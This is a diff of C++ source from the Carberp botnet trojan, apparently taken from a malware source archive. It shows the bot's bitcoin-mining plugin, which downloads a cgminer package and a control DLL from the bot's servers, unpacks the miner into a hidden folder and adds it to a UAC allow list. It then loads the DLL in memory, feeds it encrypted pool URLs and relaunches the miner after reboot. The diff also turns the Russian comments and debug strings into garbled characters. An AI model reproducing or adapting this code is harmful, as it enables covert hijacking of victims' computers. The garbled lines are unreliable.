@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "bitcoin.h"
 #include "BotDebug.h"
 #include "BotCore.h"
@@ -33,22 +44,22 @@ static char* GetBitcoinFolder( char* path )
 static DWORD WINAPI ProcessBitcoin(void*)
 {
 	BOT::Initialize();
-	DbgBtc( "Запуск процесса bitcoin" );
+	DbgBtc( "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ bitcoin" );
 	HANDLE mutex = TryCreateSingleInstance(mutexBitcoin);
-	if( mutex == 0 ) return 0; //уже есть такой процесс
+	if( mutex == 0 ) return 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD sizeBtcmCab;
-	//загружаем cgminer в cab архиве
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ cgminer пїЅ cab пїЅпїЅпїЅпїЅпїЅпїЅ
 	BYTE* btcmCab = Plugin::DownloadEx( (char*)nameBtcmCab, 0, &sizeBtcmCab, false, true, 0 );
 	DWORD sizeBtcDll;
-	//загружаем длл, управляющая всем механизмом
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	BYTE* btcDll = Plugin::DownloadEx( (char*)nameBtcDll, 0, &sizeBtcDll, true, true, 0 );
-	if( btcmCab && btcDll ) //плагины загрузились
+	if( btcmCab && btcDll ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
-		DbgBtc( "Плагины загрузились" );
+		DbgBtc( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		char tempCab[MAX_PATH], folderBitcoin[MAX_PATH];
 		File::GetTempName(tempCab);
 		File::WriteBufferA( tempCab, btcmCab, sizeBtcmCab );
-		DbgBtc( "Сохранили btcm.plug в %s", tempCab );
+		DbgBtc( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ btcm.plug пїЅ %s", tempCab );
 		GetBitcoinFolder(folderBitcoin);
 		pCreateDirectoryA( folderBitcoin, 0 );
 		pPathAppendA( folderBitcoin, "miner" );
@@ -58,16 +69,16 @@ static DWORD WINAPI ProcessBitcoin(void*)
 		{
 			pPathAppendA( folderBitcoin, "cgminer.exe" );
 			AddAllowedprogramUAC(folderBitcoin);
-			//добавляем в список искл
-			DbgBtc( "Распаковали cgmimer в папку %s", folderBitcoin );
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+			DbgBtc( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ cgmimer пїЅ пїЅпїЅпїЅпїЅпїЅ %s", folderBitcoin );
 			TMemoryDLL btc(btcDll);
 			typeInit Init = (typeInit)btc.GetProcAddress("InitMiner");
 			typeStop Stop = (typeStop)btc.GetProcAddress("StopMiner");
 			if( Init && Stop )
 			{
-				DbgBtc( "Функции найдены" );
+				DbgBtc( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 
-				//переносим зашитые урлы, разделяем их ;
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ;
 				char urls[BITCOIN_PARAM_SIZE_HOSTS];
 				TStrEnum E(BITCOIN_HOSTS, BITCOIN_PARAM_ENCRYPTED_HOSTS, 0);
 				urls[0] = 0;
@@ -79,19 +90,19 @@ static DWORD WINAPI ProcessBitcoin(void*)
 
 				wchar_t* folderBitcoinW = AnsiToUnicode( folderBitcoin, 0 );
 
-				DbgBtc( "Вызываем InitMiner(%s, %ls)", urls, folderBitcoinW );
+				DbgBtc( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InitMiner(%s, %ls)", urls, folderBitcoinW );
 				Init( urls, folderBitcoinW );
-				DbgBtc( "InitMiner() запущена успешно" );
+				DbgBtc( "InitMiner() пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 				MemFree(folderBitcoinW);
 				string fileFlag = BOT::MakeFileName( 0, flagBitcoinRunned );
 				File::WriteBufferA( fileFlag.t_str(), 0, 0 );
 				HANDLE hevent = pCreateEventA( 0, 0, 0, eventStopBitcoin );
 				pResetEvent(hevent);
-				//ждем пока не поступит команда на остановку
+				//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				pWaitForSingleObject( hevent, INFINITE );
 				Stop();
 				pDeleteFileA(fileFlag.t_str());
-				DbgBtc( "Плагин остановлен" );
+				DbgBtc( "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 			}
 		}
 	}
@@ -99,7 +110,7 @@ static DWORD WINAPI ProcessBitcoin(void*)
 	MemFree(btcmCab);
 	MemFree(btcDll);
 	pCloseHandle(mutex);
-	DbgBtc( "Процесс завершен" );
+	DbgBtc( "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	return 0;
 }
 
@@ -125,25 +136,25 @@ static void DeleteBitcoinPlugin()
 bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
 	bool ret = false;
-	if( m_lstrcmp( Args, "del" ) == 0 ) //удаление плагина
+	if( m_lstrcmp( Args, "del" ) == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		DeleteBitcoinPlugin();
 		ret = true;
 	}
-	else if( m_lstrcmp( Args, "stop" ) == 0 ) //остановка плагина
+	else if( m_lstrcmp( Args, "stop" ) == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		StopBitcoinPlugin();
 		ret = true;
 	}
-	else //запуск плагина
+	else //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 //		HANDLE mutex = TryCreateSingleInstance(mutexBitcoin);
-//		if( mutex != 0 ) //плагин не запущен
+//		if( mutex != 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //		{
 //			pCloseHandle(mutex);
 //			MegaJump(ProcessBitcoin);
 //		}
-//		else //плагин запущен, удаляем и запускаем снова
+//		else //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //		{
 			DeleteBitcoinPlugin();
 			MegaJump(ProcessBitcoin);
@@ -155,7 +166,7 @@ bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 void BitcoinRunAfterReboot()
 {
-	if( Bot->FileExists( 0, flagBitcoinRunned ) ) //если файл флаг есть, то запускаем
+	if( Bot->FileExists( 0, flagBitcoinRunned ) ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		MegaJump(ProcessBitcoin);
 	}
